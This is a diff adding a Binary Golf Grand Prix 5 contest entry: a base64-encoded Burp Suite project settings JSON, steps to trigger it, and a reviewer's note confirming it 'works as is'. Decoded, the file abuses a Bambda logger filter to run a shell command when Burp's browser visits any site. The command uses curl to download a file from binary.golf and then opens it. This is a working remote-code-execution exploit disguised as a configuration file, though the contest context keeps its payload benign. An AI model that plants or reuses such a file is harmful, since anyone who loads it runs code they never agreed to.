@@ -1,0 +1,28 @@
+---BEGIN BGGP5---
+Submit Date: 26/06
+BGGP Challenge Number: 5
+Author: caioluders
+Online Presence (Website/Social Media): @caioluders
+Target File Type: Burp Suite Project Settings JSON RCE
+File Size: 216 bytes
+SHA256 Hash: 21c2d50cc9bf6e8bc3775e4d78b5b8bf0da3b116641ec80532b78d25886322ac
+Target Environment (How do we run the file?):
+(Should work on osx and linux)
+1. Start a new project on Burp Suite
+2. In the next page, select our json configuration file
+3. Open the browser via "Open browser" in the "Proxy" tab
+4. Access any website
+5. The text editor will pop up with the contents (:
+Any additional info?: Community Edition also works
+Link to writeup, if any: Will write in the future probably.
+File contents (base64 encoded please):
+eyJiYW1iZGEiOnsibG9nZ2VyX2NhcHR1cmVfZmlsdGVyIjp7ImJhbWJkYSI6IlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tde1wic2hcIixcIi1jXCIsXCJjdXJsIC1MbyAvdG1wLzUgYmluYXJ5LmdvbGYvNS81O29wZW4gLyovNVwifSk7cmV0dXJuIHRydWU7In19LCJsb2dnZXIiOnsiY2FwdHVyZV9maWx0ZXIiOnsiZmlsdGVyX21vZGUiOiJCQU1CREEifX19
+---END BGGP5---
+
+---BEGIN VERIFICATION---
+Reviewer: samwcyo
+Review Date: 2025-03-07
+SHA256: 21c2d50cc9bf6e8bc3775e4d78b5b8bf0da3b116641ec80532b78d25886322ac
+Score: 216
+Note: works as is
+---END VERIFICATION---
